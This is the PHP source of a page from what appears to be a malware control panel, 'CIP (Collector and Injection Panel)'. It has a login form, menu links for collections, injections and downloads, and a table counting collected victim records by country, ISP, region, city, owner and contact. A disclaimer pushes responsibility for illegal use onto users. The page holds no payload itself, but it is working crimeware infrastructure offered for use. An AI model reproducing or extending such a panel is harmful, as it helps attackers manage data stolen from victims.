<?php 
	
	session_start();	
	
	require_once ("header.php");
	
	$failedGoTo = "home.php";
	$successGoTo = "collections.php";
	$logoutGoTo = "home.php";

	$access = new Access;
	$logonUser = $access->isInitAccess();
	if($logonUser) $typeUser = $access->isAdminUser();
	$access->processLogout($logoutGoTo);
	$access->processLogonRestriction($failedGoTo);
	$access->processSendAccess($successGoTo, $failedGoTo);
	unset($access);
	
	$collectionsArray = array();
	$collections = new Collections;
	$cuntryArray = $collections->getCountrys();
	//unset($collections);
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/Main.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<!-- InstanceBeginEditable name="doctitle" -->
<title>CIP (Collector and Injection Panel)</title>
<!-- InstanceEndEditable -->
<!-- InstanceBeginEditable name="head" -->
<?php  ?>
<?php  ?>
<!-- InstanceEndEditable -->
<style type="text/css">
<!--
body,td,th {
	font-family: Arial, Helvetica, sans-serif;
	color: #FFFFFF;
}
body {
	background-color: #333333;
	margin-left: 0px;
	margin-top: 20px;
	margin-right: 0px;
	margin-bottom: 0px;
}
a {
	font-size: x-small;
	color: #CCCCCC;
}
a:link {
	text-decoration: underline;
	color: #000000;
}
a:visited {
	text-decoration: underline;
	color: #000000;
}
a:hover {
	text-decoration: none;
	color: #000000;
}
a:active {
	text-decoration: underline;
	color: #000000;
}
-->
</style>
<link href="../SpryAssets/script.css" rel="stylesheet" type="text/css">
</head>

<body>
<table width="100" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td><div align="center"><a href="http://www.facebook.com/malware.customized" target="_blank"><img src="../img/banner062.jpg" alt="Banner" width="728" height="90" border="0"></a><br>
        </div></td>
      </tr>
      <tr>
        <td class="black">&nbsp;</td>
      </tr>
      <tr>
        <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td width="10" align="left" valign="top"><table width="50%" border="0" cellspacing="0" cellpadding="0">
              <!-- LOGIN OFF HEADER -->
              <?php if(!$logonUser){ ?>
              <tr>
                <td align="left" valign="top"><table width="100%" height="5" border="0" cellpadding="0" cellspacing="0" class="blackBorder">
                    <tr>
                      <td height="25" align="center" valign="middle" bgcolor="#000000"><div align="center" class="white"><strong>LOGIN </strong></div></td>
                    </tr>
                    <tr>
                      <td align="left" valign="top" class="black"><form action="<?php echo "home.php"; ?>" method="post" name="access" id="access">
                          <table width="100"  border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#666666">
                            <tr>
                              <td nowrap="nowrap" class="black">&nbsp;<br />
                                  <strong>&nbsp;Username:</strong></td>
                            </tr>
                            <tr>
                              <td nowrap="nowrap" class="black"><input autocomplete="off" name="user" type="text" class="inputText" id="user" size="15" maxlength="30" />
                                  <input autocomplete="off" name="sendSession" type="hidden" id="sendSession" value="true" /></td>
                            </tr>
                            <tr>
                              <td nowrap="nowrap" class="black"><strong>&nbsp;Password:</strong></td>
                            </tr>
                            <tr>
                              <td nowrap="nowrap" class="black"><input autocomplete="off" name="pass" type="password" class="inputText" id="pass" size="15" maxlength="30" onmouseover="ddrivetip('En este deberas ingresar tu contraseña. (es modificable)', 190)" onmouseout="hideddrivetip()" />
                                  <br />
                              </td>
                            </tr>
                            <tr>
                              <td nowrap="nowrap" class="black">&nbsp;</td>
                            </tr>
                            <tr>
                              <td valign="middle" class="black"><div align="center">
                                  <input name="Button2" type="submit" class="inputText" onmouseover="ddrivetip('Presiona este botón para iniciar sessión.', 140)" onmouseout="hideddrivetip()" value="Send" />
                                  <br />
                                  <br />
                              </div></td>
                            </tr>
                          </table>
                      </form></td>
                    </tr>
                </table></td>
              </tr>
              <?php } ?>
              <!-- LOGIN ON HEADER -->
              <?php if($logonUser){ ?>
              <tr>
                <td><table width="100%" height="5" border="0" cellpadding="0" cellspacing="0" class="blackBorder">
                    <tr>
                      <td height="25" align="center" valign="middle" bgcolor="#000000"><div align="center" class="white"><strong>OPTIONS </strong></div></td>
                    </tr>
                    <tr>
                      <td class="black"><table width="100"  border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#666666">
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;</td>
                          </tr>
                          <?php if($typeUser == 1) { ?>
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;&laquo;&nbsp;<a href="<?php echo "../doc/users.php"; ?>"><strong>Users</strong></a></td>
                          </tr>
                          <?php } ?>
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;&laquo;&nbsp;<a href="<?php echo "../doc/collections.php"; ?>"><strong>Collections</strong></a>&nbsp;</td>
                          </tr>
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;&laquo;&nbsp;<a href="<?php echo "../doc/injections.php"; ?>"><strong>Injections</strong></a></td>
                          </tr>
                          <td nowrap="nowrap" class="black">&nbsp;&laquo;&nbsp;<a href="<?php echo "../doc/downloads.php"; ?>"><strong>Downloads</strong></a></td>
                          </tr>
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;&laquo;&nbsp;<a href="<?php echo "../doc/home.php?logout=true"; ?>" class="black"><strong>Logout</strong></a></td>
                          </tr>
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;</td>
                          </tr>
                      </table></td>
                    </tr>
                </table></td>
              </tr>
              <?php } ?>
              <!-- END LOGIN HEADER -->
            </table></td>
            <td width="100%" align="right" valign="top"><!-- InstanceBeginEditable name="EditRegion3" -->
              <table width="99%" border="0" align="right" cellpadding="0" cellspacing="0" class="blackBorder">
                <tr>
                  <td height="25" align="center" valign="middle" bgcolor="#000000"><div align="center" class="white"><strong>HISTORY COLLECTIONS</strong></div></td>
                </tr>
                <tr>
                  <td align="center" valign="top" bgcolor="#666666"><br>
                    <table width="100" border="0" cellspacing="0" cellpadding="0">
                    <tr>                      </tr>
                    <tr>                      </tr>
                    <tr>                      </tr>
                    <tr>                      </tr>
                    </table>
                    <table width="100" border="0" align="center" cellpadding="0" cellspacing="0" class="blackBorder">
                      <tr>
                        <td align="center" nowrap bgcolor="#000000" class="white">&nbsp;Country&nbsp;</td>
                        <td align="center" nowrap bgcolor="#000000" class="white">&nbsp;ISP's&nbsp;</td>
                        <td align="center" nowrap bgcolor="#000000" class="white">&nbsp;Regions&nbsp;</td>
                        <td align="center" nowrap bgcolor="#000000" class="white">&nbsp;Cities&nbsp;</td>
                        <td align="center" nowrap bgcolor="#000000" class="white">&nbsp;Owners&nbsp;</td>
                        <td align="center" nowrap bgcolor="#000000" class="white">&nbsp;Cotacts&nbsp;</td>
                      </tr>
                     <?php 
					  	if(count($cuntryArray)>0){ 
							for($i=0; $i<count($cuntryArray); $i++){
								$arrayCount = $collections->getCount($cuntryArray[$i], true);
								
								echo "<tr>\n";
								echo "<td align=\"left\" nowrap class=\"white\">&nbsp;".$cuntryArray[$i]."&nbsp;</td>\n";
								echo "<td align=\"center\" nowrap class=\"white\">&nbsp;".$arrayCount["isp"]."&nbsp;</td>\n";
								echo "<td align=\"center\" nowrap class=\"white\">&nbsp;".$arrayCount["regions"]."&nbsp;</td>\n";
								echo "<td align=\"center\" nowrap class=\"white\">&nbsp;".$arrayCount["cities"]."&nbsp;</td>\n";
								echo "<td align=\"center\" nowrap class=\"white\">&nbsp;".$arrayCount["owners"]."&nbsp;</td>\n";
								
								$arrayCount = $collections->getCount($cuntryArray[$i], false);
								
								echo "<td align=\"center\" nowrap class=\"white\">&nbsp;".$arrayCount[0]."&nbsp;</td>\n";
							  	echo "</tr>\n";
							}
						}
						else{
							echo "<tr>\n";
							echo "<td align=\"left\" nowrap class=\"white\">&nbsp;</td>\n";
							echo "<td align=\"center\" nowrap class=\"white\">&nbsp;</td>\n";
							echo "<td align=\"center\" nowrap class=\"white\">&nbsp;</td>\n";
							echo "<td align=\"center\" nowrap class=\"white\">&nbsp;</td>\n";
							echo "<td align=\"center\" nowrap class=\"white\">&nbsp;</td>\n";
							echo "<td align=\"center\" nowrap class=\"white\">&nbsp;</td>\n";
						  	echo "</tr>\n";
						}
						unset($collections);
					  ?>
                      
                    </table>
<br></td>
                </tr>
              </table>
<!-- InstanceEndEditable --></td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td>&nbsp;</td>
      </tr>
      <tr>
        <td><table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#666666" class="blackBorder">
          <tr>
            <td><div align="center">
              <p class="black">© 2011 CIP (Collector and Injection Panel) All rights reserved  | Developed by <a href="https://www.facebook.com/jheto.xekri" target="_blank">Jheto Xekri</a>.</p>
                <p class="black">Using this tool indicates that you have read and accept these terms, <br>
                  if you do not accept these terms, you not authorized to use this tool.<br>
                  <br>
                  This tool is provided only under user responsibility, the user assumes sole all <br>
                  responsibility                  for use wrong or illegal of this tool,  damage caused to third <br>
                  parties responsibility of the user, is not my responsibility the uses of this tool.</p>
</div></td>
          </tr>
        </table></td>
      </tr>
      
      
    </table></td>
  </tr>
</table>
</body>
<!-- InstanceEnd --></html>
